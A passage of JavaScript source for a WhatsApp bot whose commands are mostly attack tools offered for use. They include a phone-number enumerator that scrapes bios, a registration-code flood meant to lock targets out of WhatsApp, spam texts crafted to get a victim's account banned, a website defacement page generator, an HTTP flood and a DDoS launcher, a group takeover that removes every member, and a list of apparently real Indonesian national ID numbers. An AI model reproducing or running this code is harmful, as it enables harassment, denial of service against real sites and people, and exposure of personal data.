        asupan = JSON.parse(fs.readFileSync('./lib/#Alwaysaqio0/tiktokgirl.json'))
        hasil = pickRandom(asupan)
        qio.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url } }, { quoted: m })
        break

      case '/tiktokghea':
        m.reply('Tunggu')
        asupan = JSON.parse(fs.readFileSync('./lib/#Alwaysaqio0/gheayubi.json'))
        hasil = pickRandom(asupan)
        qio.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url } }, { quoted: m })
        break

      case '/tiktoknukhty':
        m.reply('Tunggu')
        asupan = JSON.parse(fs.readFileSync('./lib/#Alwaysaqio0/ukhty.json'))
        hasil = pickRandom(asupan)
        qio.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url } }, { quoted: m })
        break

      case '/tiktoksantuy':
        m.reply('Tunggu')
        asupan = JSON.parse(fs.readFileSync('./lib/#Alwaysaqio0/santuy.json'))
        hasil = pickRandom(asupan)
        qio.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url } }, { quoted: m })
        break

      case '/tiktokkayes':
        m.reply('Tunggu')
        asupan = JSON.parse(fs.readFileSync('./lib/#Alwaysaqio0/kayes.json'))
        hasil = pickRandom(asupan)
        qio.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url } }, { quoted: m })
        break

      case '/tiktokpanrika':
        m.reply('Tunggu')
        asupan = JSON.parse(fs.readFileSync('./lib/#Alwaysaqio0/panrika.json'))
        hasil = pickRandom(asupan)
        qio.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url } }, { quoted: m })
        break

      case '/tiktoknotnot':
        m.reply('Tunggu')
        asupan = JSON.parse(fs.readFileSync('./lib/#Alwaysaqio0/notnot.json'))
        hasil = pickRandom(asupan)
        qio.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url } }, { quoted: m })
        break

      case '/nowa': {
        if (!isMurbug) return replygw(ownerprem)
        if (!q) return m.reply(`insert Number, example: ${prefix + command} 62853388888xxx`)
        var noteks = args[0]
        if (!noteks.includes('x')) return m.reply('Enter the suffix x to find the number?')
        function countInstances(string, word) {
          return string.split(word).length - 1;
        }
        var nomer0 = noteks.split('x')[0]
        var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
        var random_length = countInstances(noteks, 'x')
        if (random_length > 4) {
          return m.reply('Maaf, hanya bisa mencari nomor dengan maksimal 4 x')
        }
        var random;
        m.reply('Loading')
        if (random_length == 1) {
          random = 10
        } else if (random_length == 2) {
          random = 100
        } else if (random_length == 3) {
          random = 1000
        } else if (random_length == 4) {
          random = 10000
        }
        var nomerny = `Have a bio\n`
        var no_bio = `\nWithout Bio / Default bio.\n`
        var no_watsap = `\nNot registered on whatsapp\n`
        var data = {}
        for (let i = 0; i < random; i++) {
          var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
          var t1 = nu[Math.floor(Math.random() * nu.length)]
          var t2 = nu[Math.floor(Math.random() * nu.length)]
          var t3 = nu[Math.floor(Math.random() * nu.length)]
          var t4 = nu[Math.floor(Math.random() * nu.length)]
          var rndm;
          if (random_length == 1) {
            rndm = `${t1}`
          } else if (random_length == 2) {
            rndm = `${t1}${t2}`
          } else if (random_length == 3) {
            rndm = `${t1}${t2}${t3}`
          } else if (random_length == 4) {
            rndm = `${t1}${t2}${t3}${t4}`
          }
          var anu = await qio.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
          var anuu = anu.length !== 0 ? anu : false
          try {
            try {
              var anu1 = await qio.fetchStatus(anu[0].jid)
            } catch {
              var anu1 = '401'
            }
            if (anu1 == '401' || anu1.status.length == 0) {
              no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
            } else {
              const year = moment(anu1.setAt).tz('Asia/Jakarta').format('YYYY');
              if (!(year in data)) {
                data[year] = [];
              }
              data[year].push(`wa.me/${anu[0].jid.split("@")[0]}\nBio : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`);
            }
          } catch {
            no_watsap += `${nomer0}${i}${nomer1}\n`
          }
        }
        const bio = Object.keys(data)
          .map((key) => {
            return `*[ ${key} ]*\n${data[key].join('')}`
          })
          .join('\n')
        const hasil = `Results of\n${noteks}:\n\n${nomerny}${bio}${no_bio}${no_watsap}\n\n.`
        m.reply(hasil)
      }
        break

      case '/bugvid1':
        if (!isMurbug) return m.reply('*.*')
        bugvid1 = fs.readFileSync('./lib/#Alwaysaqi0o/bug1.mp4')
        qio.sendMessage(from, { video: bugvid1 }, { quoted: qioelit })
        break


      case '/sendspyware':
        if (!isPrem) return replygw(ownerprem)
        if (!q) return replygw(`Penggunaan .${command} 628xxx`)
        let pepec = q.replace(/[^0-9]/g, "")
        if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai deng an angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
        let Pe = pepec + '@s.whatsapp.net'
        await m.reply(`*_Succes Send ${command}_* 
𝐓𝐞𝐫𝐢𝐦𝐚 𝐒𝐌𝐒 𝐁𝐚𝐫𝐮

𝐩𝐞𝐧𝐠𝐢𝐫𝐢𝐦 : Alwaysaqioo
𝐩𝐞𝐬𝐚𝐧 : Pelanggan yth, Paket Pendidikan akan berakhir pada tanggal 09/09/1999 jam 09:09 WIT.

NOMER TARGET: ${Pe}

𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐛𝐲 : Alwaysaqioo`)
        qio.sendMessage(Pe, { text: `Pelanggan yth, Paket Pendidikan akan berakhir pada tanggal 09/09/1999 jam 09:09 WIT.` })
        await sendspyware(Pe)
        break


      case '/bugvid2':
        if (!isMurbug) return m.reply('*.*')
        bugvid1 = fs.readFileSync('./lib/#Alwaysaqi0o/bug2.mp4')
        qio.sendMessage(from, { video: bugvid1 }, { quoted: qioelit })
        break

      case '/paptt':
        if (!isMurbug) return replygw(ownerprem)
        if (!q) return m.reply(`Example ${prefix + command} foto/video`)
        papttfoto = JSON.parse(fs.readFileSync('./lib/paptt-foto.json'))
        papttvideo = JSON.parse(fs.readFileSync('./lib/paptt-video.json'))
        titid1 = (pickRandom(papttfoto))
        titid2 = (pickRandom(papttvideo))
        if (q == 'foto') {
          m.reply("Photos will be sent via private chat ( *PC* )")
          qio.sendMessage(m.sender, { image: { url: titid1 }, caption: 'Mana Tahan🥵' }, { quoted: m })
        } else if (q == 'video') {
          m.reply("Video will be sent via private chat ( *PC* )")
          qio.sendMessage(m.sender, { video: { url: titid2 }, caption: 'Mana Tahan🥵' }, { quoted: m })
        }
        break

      case '/tourl': {
        if (!isMurbug) return replygw(ownerprem)
        if (!quoted) return m.reply(`m.reply Media`)
        m.reply('*please wait a moment*')
        let media = await qio.downloadAndSaveMediaMessage(quoted)
        if (/image/.test(mime)) {
          anuh = await TelegraPh(media)
          m.reply(util.format(anuh))
        } else if (/video/.test(mime)) {
          anuh = await TelegraPh(media)
          m.reply(util.format(anuh))
        } else if (!/image/.test(mime)) {
          anuh = await UploadFileUgu(media)
          m.reply(util.format(anuh))
        }
        await fs.unlinkSync(media)
      }
        break

      case '/txtban1':
        if (!isMurbug) return replygw(ownerprem)
        m.reply(`Hola😁, ¿necesitas dinero? Ofrezco un sitio de apuestas en línea con premios en metálico de $700 y condiciones simples. Puedes hacer un depósito mínimo de $70 y puedes duplicar tu dinero.
💰 Realice un depósito inmediatamente en mi sitio de apuestas en línea y obtenga la mayor cantidad de dinero posible. registrarse en mi sitio de apuestas en línea a través de
Enlace : https://registrarse.en.el.sitio.de.apuestas/
Correo electrónico : support@support.whatsapp.com
Whatsapp : https://api.whatsapp.com/send?phone=`)
        break

      case '/txtban2':
        if (!isMurbug) return replygw(ownerprem)
        m.reply(`Hola, ¿Necesitas un trabajo para ganar dinero? Quiero ofrecerte un trabajo muy fácil y podrás duplicar todo tu dinero. Te ofrezco un trabajo, concretamente ser administrador de un sitio de juegos de azar online con un premio de 900$ y un depósito mínimo de 70$. Si estás interesado en aceptar una oferta de trabajo mía, puedes comunicarte al número de soporte 👇
https://api.whatsapp.com/send?phone=
💰 También puedes participar en este juego de apuestas en línea registrándote en nuestro sitio y realizando un depósito mínimo de 70$. Vamos, deposita inmediatamente para duplicar tu dinero 💸. Regístrese en nuestro sitio de apuestas en línea y el enlace de registro está disponible a continuación 👇
https://registrarse.en.el.sitio.de.apuestas/
*support@support.whatsapp.com*`)
        break

      case '/txtban3':
        if (!isMurbug) return replygw(ownerprem)
        m.reply(`🎲 ONLINE-WETSEITE 🎲
Hallo, ich komme von einem Online-Glücksspielseitenunternehmen namens Alwaysaqioo. Ich bin hier, um Ihnen anzubieten, Ihr Geld sofort zu verdoppeln. Sie können es verdoppeln, indem Sie auf der Wettseite Alwaysaqioo einen Nominalwert von 80 $ und einen Preis von 900 $ einzahlen. Bitte registrieren Sie sich über den Link 👇 auf der Online-Glücksspielseite Alwaysaqioo
🎮 Wettseiten: https://register.alwaysaqioo.bet/
Alternative zur Registrierung 👇
🎮 Facebook : Alwaysaqioo
🎮 Whatsapp : https://api.whatsapp.com/send?phone=+6289630514341
Bitte registrieren Sie sich, um Ihr Geld zu verdoppeln 🤤`)
        break

      case '/bannedno':
        if (!isMurbug) return replygw(ownerprem)
        if (!q) return m.reply(' Enter the Target number Prefix "+" and Country Code')
        await qio.sendMessage(from, { text: `اربح المال بسهولة عبر الإنترنت لمدة ساعة واحدة بسعر 10 آلاف💰.\nفقط في هذا الاستبيان، قم بتسجيل حسابك على الفور، ما عليك سوى رقم واتساب جاهز للاتصال بالإنترنت 🤑.\nلا تفوت هذه الفرصة، سجل الآن باستخدام رمز QR 📄\n\nقم بالرد بـ "1" وانقر على الرابط أدناه 👇\nhttps://server.go-share.top/\n\nوتواصل مع WhatsApp الخاص بي إذا كنت ترغب في الحصول على مكافأة!!🎁\nhttps://api.whatsapp.com/send?phone=${q}` }, { quoted: m })
        sleep(2000)
        m.reply(`👆  text above then check Target number 👆\n\n\n ⚠️ Warning: not all numbers can be banned`)
        break


      case '/infono':
        if (!isDeveloper) return replygw(ownerprem)
        if (!q) return m.reply(' Enter the Target number Prefix "+" and Country Code')
        await qio.sendMessage(from, {
          text: `informasi kontak
Name : ${m.pushName}
Number : ${q}
Status : *${isPrem ? '✅' : `❌`}*`
        }, { quoted: m })
        break


      case '/deface':
        if (!isMurbug) return replygw(ownerprem)
        if (!q) return m.reply('Masukkan Namamu')
        await qio.sendMessage(from, {
          text: `<!DOCTYPE html><html>
  <head>
    <center>
      <img src="https://b.top4top.io/p_3062ktq8j0.png"width="350px">
    </center>
  <title> Hacked by ☠️ Mr.${q} 👑</title>
  <meta charset="UTF-8"/>
  <meta name="author" content="${q}"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta name="description" content=""/>
  <meta property="og:title" content=" BACOT isPrem SOK-SOK BAIK LOO/>
  <meta name="keywords" content="${q}  - Alwaysaqioo, Mr Elang Xploit ,hacked by ${q} ,haxor uploader, haxor script deface generator, nathan prinsley, mr.prins, prinsh, hacked by, haxor my id"/>
  <meta property="og:image" content=""/>
  <meta property="og:type" content="website"/> <meta property="og:site_name" content="${q}"/><link rel="shortcut icon" type="image/x-icon" href="" /><link rel="stylesheet" type="text/css" href="https://cdn.prinsh.com/NathanPrinsley-textstyle/nprinsh-stext.css"/><style>body{background: black;font-family:Courier New;margin-top:35px;}h1,h2{margin-top:.3em;margin-bottom:.3em;}h1.nprinsleyy{color:#dbd9d9;}h2{color:#07ad1d;}p.message_prinsley{color:#dbd9d9;margin-top:.25em;margin-bottom:.25em;font-size:16px;font-weight:unset;}.hubungi_prinsh{color:#dbd9d9;text-decoration:none;}.hubungi_prinsh:hover{color:red}.othermes_nprinsh{color:#dbd9d9;font-size:16px;}marquee.foonathanPrinsley{display:none;position: fixed; width: 100%; bottom: 0px; font-family: Tahoma; height: 20px; color: white; left: 0px; border-top: 2px solid darkred; padding: 5px; background-color: black}</style></head><body><center/><img src="" style="width: 20%">
  <h1 class="nprinsleyy nprinsley-text-glitchan" style="font-size:20px;"> ☠️ ${q} 👑 </h1><h2 style="font-size:20px;" class="nprinsley-text-redan">WELCOME TO WEBSITE ${q}</h2><p class="message_prinsley nathan-prinsley_none"></p><hr/><p style="font-size:14px;" class="nprinsley-text-blupelan"><a class="</a></p><p class="othermes_nprinsh nprinsley-text-glitchan">We are a group of Muslim hackers who want to eradicate crime
 </p> <center> <audio controls aria-setsize="8">
			<source src="https://f.top4top.io/m_3033r85vv0.mp3" type="audio/mpeg">
			isPrem banyak bacot doang</audio> </center> <arquee class="foonathanPrinsley"><b style="color: #dbd9d9;font-size:16px;" class="nathan-prinsley_none"></b></marquee>
  </center>
  <script src="https://cdn.prinsh.com/NathanPrinsley-effect/efek-salju.js" type="text/javascript"></script>
  <table border="2">
    <tr>
      <td>
        <center>
  <a href="https://youtube.com/@qioaje"><button>YOUTUBE</button></a>
  </center>
  <style>
    button {
      color: cyan;
      background: black;
    }
  </style>
      <br>
<br><p class="style14" align="center">
<marquee scrolldelay="20" scrollamount="145" direction="right" behavior="scroll" width="98%">
<b><font color="white" face="Courier New" size="2">   --------------------------------------------------------------</marquee></b></font>
<marquee scrolldelay="20" scrollamount="8" direction="left" behavior="scroll" width="98%">
<font color="#ff0000" face="Courier New" size="3"> Thanks #Always-Compact #Fanatix_Cyber_Security #Cyber_Team_Indonesia </marquee></font>
<br>
<marquee scrolldelay="20" scrollamount="145" direction="left" behavior="scroll" width="98%">
<b><font color="white" face="Courier New" size="2">   --------------------------------------------------------------</marquee></b></font>
<iframe width="0" height="0" src="http://www.youtube.com/@qioaje/v/&autoplay=1" frameborder="0"></iframe>`}, { quoted: m })
        sleep(2000)
        m.reply(`👆  Tutor pakenya cari aja di yt`)
        break

      case '/tempban': {
        if (!isDeveloper) return replygw(ownerprem)
        if (!text) return m.reply(`Example: ${prefix + command} 62|8xxx`)
        if (!/|/.test(text)) return m.reply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|8xxx`)
        let numbers = JSON.parse(fs.readFileSync('./lib/tempban.json'))

        let cCode = q.split("|")[0]
        let number = q.split("|")[1]
        let fullNo = cCode + number

        await m.reply(`❗ Sukses! Gangguan Registrasi telah berhasil diaktifkan ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down Ⓜ️.`)

        let { state, saveCreds } = await useMultiFileAuthState('tb')

        let spam = makeWaSocket({
          auth: state,
          mobile: true,
          logger: pino({ level: 'silent' })
        })

        let dropNumber = async () => {
          try {
            let res = await spam.requestRegistrationCode({
              phoneNumber: `+${fullNo}`,
              phoneNumberCountryCode: cCode,
              phoneNumberNationalNumber: number,
              phoneNumberMobileCountryCode: 724,
            })

            if (res.reason === 'temporarily_unavailable') {
              console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
              await sleep(1000)
              await dropNumber()
            }
          } catch (error) {
            console.error(error)
          }
        }

        numbers[fullNo] = { cCode, number };
        fs.writeFileSync('./lib/tempban.json', JSON.stringify(numbers, null, '\t'));
        setInterval(() => {
          dropNumber()
        }, 400)
      }
        break

      case '/payment': {
        m.reply(`Dana : ${adana}\nOvo : ${aovo}\nQris : ${aqris}\nGopay : ${agopay}`)
      }
        break


      case '/kudetathp1': {
        if (!isPrem) return replygw(ownerprem)
        if (!isGroup) return m.reply(`Khusus Group Bego`)
        if (!isAdmins && !isDeveloper) return m.reply('Khusus Admin')
        if (!isBotAdmins) return m.reply(`Bot Bukan Admin Bego`)
        if (!quoted) return m.reply(`*Where is the picture?*`)
        if (!/image/.test(mime)) return m.reply(`\`Send/m.reply Image With Caption\` *${prefix + command}*`)
        if (/webp/.test(mime)) return m.reply(`\`Send/m.reply Image With Caption\` *${prefix + command}*`)
        var mediz = await qio.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
        if (args[0] == `full`) {
          var { img } = await generateProfilePicture(mediz)
          await qio.query({
            tag: 'iq',
            attrs: {
              to: m.chat,
              type: 'set',
              xmlns: 'w:profile:picture'
            },
            content: [
              {
                tag: 'picture',
                attrs: { type: 'image' },
                content: img
              }
            ]
          })
          fs.unlinkSync(mediz)
        } else {
          var memeg = await qio.updateProfilePicture(m.chat, { url: mediz })
          fs.unlinkSync(mediz)
          m.reply(`*lanjut ke ${prefix}kudetathp2*`)
        }
      }
        break

      case '/kudetathp2': {
        if (!isPrem) return replygw(ownerprem)
        if (!isGroup) return m.reply(`Khusus Group Bego`)
        if (!isAdmins && !isDeveloper) return m.reply('Khusus Admin')
        if (!isBotAdmins) return m.reply(`Bot Bukan Admin Bego`)
        await qio.groupUpdateSubject(m.chat, '𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝙈𝙍./𝘼𝙇𝙒𝘼𝙔𝙎𝘼𝙌𝙄𝙊𝙊')
        await qio.groupUpdateDescription(m.chat, '𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝙈𝙍./𝘼𝙇𝙒𝘼𝙔𝙎𝘼𝙌𝙄𝙊𝙊')
        let data = participants.map((x) => x.id)
        for (let x of data) {
          if (x !== botNumber && x !== groupMetadata.owner && x !== kontributor + "@s.whatsapp.net") {
            await qio.groupParticipantsUpdate(m.chat, [x], "remove")
            await m.reply(`𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝙈𝙍./𝘼𝙇𝙒𝘼𝙔𝙎𝘼𝙌𝙄𝙊𝙊`)
          }
        }
      }
        break


      case '/nikparse': { //by moraxs inc
        if (!isPrem) return
        if (!q) return m.reply(`*Example*: ${prefix + command} 3216728xxxxxxx`)
        nik = q.toString();
        const moraxs = require('./lib/wilayah.json');
        const white = new Date().getFullYear().toString().substr(-2);
        const green = nik.substring(10, 12);
        const yellow = nik.substring(6, 8);
        if (nik.length == 16) {
          provinceid = nik.substring(0, 2);
          province = (moraxs.provinsi[nik.substring(0, 2)]);
          kabupatenKotaId = nik.substring(0, 4);
          kabupatenKota = (moraxs.kabkot[nik.substring(0, 4)]);
          kecamatanId = nik.substring(0, 6);
          kecamatan = (moraxs.kecamatan[nik.substring(0, 6)].split(' -- ')[0]);
          kodepos = (moraxs.kecamatan[nik.substring(0, 6)].slice(-5));
          kelamin = (yellow > 40 ? "Perempuan" : "Laki-laki");
          lahir = (yellow > 40 ? ((yellow - 40).toString().length > 1 ? (yellow - 40).toString() : `0${(yellow - 40).toString()}`) : yellow);
          X = nik.substring(8, 10);
          V = (green < white ? `20${green}` : `19${green}`);
          Z = nik.substring(12, 16);
        } else {
          return m.reply('Nomor NIK harus 16 digit')
        }
        await sleep(3000);
        m.reply(`[ ALWAYSQIOO ]\n\nNik: ${q}\nProvice ID: ${provinceid}\nProvince: ${province}\nKabupaten ID: ${kabupatenKotaId}\nNama Kabupaten: ${kabupatenKota}\nKecamatan ID: ${kecamatanId}\nNama Kecamatan: ${kecamatan}\nKode Pos: ${kodepos}\nKelamin: ${kelamin}\nLahir: ${lahir}/${X}/${V}\nUniqcode: ${Z}`)
      }
        break

      case '/getnik': {
        if (!isPrem) return replygw(ownerprem)
        if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
        var khodams = [`📆Tanggal registrasi:  2018-11-29
🔖NIK:  3175075505001002
 `, `📆Tanggal registrasi:  2018-07-12
🔖NIK:  1401034305730003
 `, `📆Tanggal registrasi:  2018-07-20
🔖NIK:  1506067005830001
 `, `📆Tanggal registrasi:  2019-11-04
🔖NIK:  1206137112760005
 `, `📆Tanggal registrasi:  2017-12-05
🔖NIK:  7471103105890001
 `, `📆Tanggal registrasi:  2018-03-28
🔖NIK:  1306142811140001
 `, `📆Tanggal registrasi:  2018-05-09
🔖NIK:  1312114109710004
 `, `📆Tanggal registrasi:  2018-03-16
🔖NIK:  1207226306910001
 `, `📆Tanggal registrasi:  2019-05-02
🔖NIK:  1871130106810002
 `, `📆Tanggal registrasi:  2018-02-19
🔖NIK:  2171102810850004
 `, `📆Tanggal registrasi:  2019-11-16
🔖NIK:  1371115011010016
 `, `📆Tanggal registrasi:  2020-01-17
🔖NIK:  1209153008970004
 `, `📆Tanggal registrasi:  2018-11-29
🔖NIK:  3175075505001002
 `, `📆Tanggal registrasi:  2017-12-16
🔖NIK:  7571045705890002
 `, `📆Tanggal registrasi:  2017-11-27
🔖NIK:  3172044107690002
 `, `📆Tanggal registrasi:  2017-11-28
🔖NIK:  3172044601950001
 `, `📆Tanggal registrasi:  2019-07-27
🔖NIK:  3318120612820001
 `, `📆Tanggal registrasi:  2018-02-12
🔖NIK:  3327082807710023
 `, `📆Tanggal registrasi:  2018-04-21
🔖NIK:  3328163112560085
 `, `📆Tanggal registrasi:  2018-03-05
🔖NIK:  3316154106860001
 `, `📆Tanggal registrasi:  2018-12-27
🔖NIK:  3322073008110001
 `, `📆Tanggal registrasi:  2017-12-31
🔖NIK:  1571032512790021`]
        var khodams = khodams[Math.floor(Math.random() * khodams.length)]
        m.reply(`Nama : ${q}\nNik Anda : *${khodams}*`)
      }
        break


      case '/lacaklokasi':
        if (!isPrem) return replygw(ownerprem)
        if (!q) return m.reply(' Enter name')
        await qio.sendMessage(from, { text: `di bumi, di atas tanah, di Indonesia` }, { quoted: m })
        sleep(2000)
        m.reply(`🗿`)
        break

      case '/topup-game':
        if (!isMurbug) return replygw(ownerprem)
        if (!q) return m.reply(`Enter nama game , contoh : ${command}free-fire`)
        await qio.sendMessage(from, { text: `https://www.codashop.com/id-id/${q}` }, { quoted: m })
        sleep(2000)
        m.reply(`👆  klik link untuk topup ${q}`)
        break

      case '/topup-saldo':
        if (!isMurbug) return replygw(ownerprem)
        if (!q) return m.reply(`Enter nama game , contoh : ${command}dana`)
        await qio.sendMessage(from, { text: `https://www.hotelmurah.com/pulsa/top-up-${q}` }, { quoted: m })
        sleep(2000)
        m.reply(`👆  klik link untuk topup ${q}`)
        break

      case '/suntik':
        if (!isMurbug) return replygw(ownerprem)
        if (!q) return m.reply(`Enter nama sosmed , contoh : ${command} Instagram`)
        await qio.sendMessage(from, { text: `https://followersmurahgaransi.id/order/${q}-s1` }, { quoted: m })
        sleep(2000)
        m.reply(`👆  klik link untuk suntik ${q}`)
        break

      case '/lacak-resi-jnt':
        if (!isMurbug) return replygw(ownerprem)
        if (!q) return m.reply(' Enter resi kode')
        await qio.sendMessage(from, { text: `https://www.cekidot.id/cek-resi/jnt/${q}` }, { quoted: m })
        sleep(2000)
        m.reply(`👆  klik link dan scroll untuk melihat resi`)
        break

      case '/lacak-resi-jne':
        if (!isMurbug) return replygw(ownerprem)
        if (!q) return m.reply(' Enter resi kode')
        await qio.sendMessage(from, { text: `https://www.cekidot.id/cek-resi/jne/${q}` }, { quoted: m })
        sleep(2000)
        m.reply(`👆  klik link dan scroll untuk melihat resi`)
        break

      case '/lacak-resi-sicepat':
        if (!isMurbug) return replygw(ownerprem)
        if (!q) return m.reply(' Enter resi kode')
        await qio.sendMessage(from, { text: `https://www.cekidot.id/cek-resi/sicepat/${q}` }, { quoted: m })
        sleep(2000)
        m.reply(`👆  klik link dan scroll untuk melihat resi`)
        break

      case '/lacak-resi-pos':
        if (!isMurbug) return replygw(ownerprem)
        if (!q) return m.reply(' Enter resi kode')
        await qio.sendMessage(from, { text: `https://www.cekidot.id/cek-resi/pos/${q}` }, { quoted: m })
        sleep(2000)
        m.reply(`👆  klik link dan scroll untuk melihat resi`)
        break

      case '/lacak-resi-wahana':
        if (!isMurbug) return replygw(ownerprem)
        if (!q) return m.reply(' Enter resi kode')
        await qio.sendMessage(from, { text: `https://www.cekidot.id/cek-resi/wahana/${q}` }, { quoted: m })
        sleep(2000)
        m.reply(`👆  klik link dan scroll untuk melihat resi`)
        break

      case '/lacak-resi-anteraja':
        if (!isMurbug) return replygw(ownerprem)
        if (!q) return m.reply(' Enter resi kode')
        await qio.sendMessage(from, { text: `https://www.cekidot.id/cek-resi/anteraja/${q}` }, { quoted: m })
        sleep(2000)
        m.reply(`👆  klik link dan scroll untuk melihat resi`)
        break

      case '/happymod':
        if (!isMurbug) return replygw(ownerprem)
        if (!q) return m.reply(' Enter resi kode')
        await qio.sendMessage(from, { text: `https://ind.happymod.com/search.html?q=${q}` }, { quoted: m })
        sleep(2000)
        m.reply(`👆  klik link dan scroll untuk download ${q}`)
        break

      case '/download-apk':
        if (!isMurbug) return replygw(ownerprem)
        if (!q) return m.reply(' Enter resi kode')
        await qio.sendMessage(from, { text: `https://apkpure.com/id/search?q=${q}` }, { quoted: m })
        sleep(2000)
        m.reply(`👆  klik link dan scroll untuk download ${q}`)
        break

      case '/ddos': {
        if (!isPrem) return replygw(ownerprem)
        if (!q.includes(' ')) return m.reply(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60`)
        const targetweb = q.substring(0, q.indexOf(' ') - 0)
        const timeweb = q.substring(q.lastIndexOf(' ') + 1)
        let moci = `*Bot is Attacking Wait for Results* 😤
• _Target_ ->  ${targetweb} 
• _Time Attack_ -> ${timeweb} `
        qio.sendButton(from, [{
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Cek Websait",
            url: `${targetweb}`,
            merchant_url: `${targetweb}`
          })
        }], m, {
          body: moci,
          footer: ''
        })
        exec(`node ./lib/#-Alwaysaqioo/ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
          if (error) {
            m.reply(`Error: ${error.message}`);
            return;
          }
          if (stderr) {
            kmm.reply(`Error: ${stderr}`);
            return;
          }
          m.reply(`Success\n\n• Target: ${targetweb},\n• Time: ${timeweb}`);
        });
      }
        break


      case '/cekkhodamcore': {
        if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
        var khodams = ['ulat bulu', 'paracetamol', 'cabul', 'burung prikitiw', 'kipas cosmos', 'vitamin c', 'kipas angin', 'Buaya darat', 'meja berjalan', 'yatim', 'ikan cupang', 'kodok', 'kosong', 'mayat hidup', 'merpati', 'minyak sarimurni', 'lampu LID', 'tikus kencing', 'sirup abc']
        var khodams = khodams[Math.floor(Math.random() * khodams.length)]
        m.reply(`Nama : ${q}\nkhodam anda : *${khodams}*`)
      }
        break

      case '/cekkhodam': {
        if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
        var khodams = ['macan putih', 'harimau hitam', 'harimau sumatera', 'burung hantu', 'macan tutul hitam', 'burung gagak', 'kipas angin', 'komodo bermata merah', 'banteng bermata merah', 'rusa bertanduk satu', 'kosong', 'burung jalak', 'kelelawar biru', 'buaya putih', 'merpati', 'rawa rontek']
        var khodams = khodams[Math.floor(Math.random() * khodams.length)]
        m.reply(`Nama : ${q}\nkhodam anda : *${khodams}*`)
      }
        break

      case '/cekjodoh': {
        if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
        var jodoh = ['etek markopet', 'uni as', 'uni maria', 'uni bakwan', 'popo berby', 'mimi pery', 'uni bika', 'uni bakwan', 'kosong', 'sumiati', 'yanto']
        var jodoh = jodoh[Math.floor(Math.random() * jodoh.length)]
        m.reply(`Nama : ${q}\nJodoh anda : *${jodoh}*`)
      }
        break


      case '/cekkuota': {
        if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
        var pulsa = ['1kb', '5mb', '20mb', '3gb', '5gb', '7gb', '10gb', '1gb', 'banteng 2gb', '2.5gb', '1tb', '7mb', 'habis', '1,3gb', '4,1gb', '0,1kb']
        var pulsa = pulsa[Math.floor(Math.random() * pulsa.length)]
        m.reply(`Nama : ${q}\nkuota anda : *${pulsa}*`)
      }
        break
      //=================================================//
      case '/fetch': {
        if (!isPrem) return replygw(ownerprem)
        let url = q.split(" ")[0]
        let time = q.split(" ")[1] * 1000

        if (args.length === 2 && url && !isNaN(time)) {
          let attack = () => {
            let totalRequests = 0
            let threads = []

            for (let j = 0; j < 6; j++) {
              threads.push(
                new Promise((resolve, reject) => {
                  let interval = setInterval(() => {
                    for (let j = 0; j < 100; j++) {
                      fetch(url)
                        .then(() => {
                          totalRequests++
                          console.log(`Attacking => ${url} Total Requests: ${totalRequests} Duration: ${time}`)
                        })
                        .catch(err => { })
                    }
                  }, 750)
                  setTimeout(() => {
                    clearInterval(interval)
                    resolve()
                  }, time)
                })
              )
            }

            Promise.all(threads)
              .then(() => console.log("Attack complete"))
              .catch(err => console.error("Error in attack:", err))
          }

          attack()
        } else {
          m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time]`)
        }
      }
        break
      //=================================================//
      case "/checkhost": {
        if (!q) return m.reply(`Example : ${m.prefix + m.command} https://nxnn.com`)
        let msg = {
          viewOnceMessage: {
            message: {
              "interactiveMessage": {
                "header": {
                  "title": "",
                  "subtitle": "p"
                },
                "body": {
                  "text": "Klik Chech Host Untuk Untuk Memeriksa Web"
                },
                "footer": {
                  "text": "Alwaysaqioo Top"
                },
                "nativeFlowMessage": {
                  "buttons": [
                    {
                      "name": "cta_url",
                      "buttonParamsJson": `{ display_text : 'Check Host' , url : "https://check-host.net/check-http?host=${q}", merchant_url : "https://check-host.net/check-http?host=${q}" }`
                    }
                  ],
                  "messageParamsJson": ""
                }
              }
            }
          }
        }
        qio.relayMessage(m.chat, msg, {});
      }
        break

      //=====================(!) BUG SEND TARGET============================//
      case '/qio-force': case '/qio-conquer': case '/qio-eterno': case '/qio-kill': case '/qio-notif': case '/qio-🧸': case '/qio-🥵': case '/qio-😍': {
        if (!isPrem) return replygw(ownerprem)
        if (!q) return replygw(`Penggunaan .${command} 628xxx`)
